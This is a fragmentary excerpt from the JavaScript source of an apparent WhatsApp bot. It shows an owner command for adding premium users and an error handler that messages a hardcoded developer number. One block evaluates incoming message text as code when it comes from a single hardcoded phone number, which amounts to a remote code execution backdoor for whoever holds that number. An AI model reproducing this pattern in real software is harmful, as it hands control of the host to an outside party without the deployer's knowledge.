...
var xeonytimewisher = `Good Morning 🌄`
		...
		if (isEval && senderNumber == "62895395007536") {
			let evaled,
				text = q,
...
case 'addprem':
if (!XeonTheCreator) return XeonStickOwner()
if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 62895395007536`)
...
let e = String(err)
XeonBotInc.sendMessage("62895395007536@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
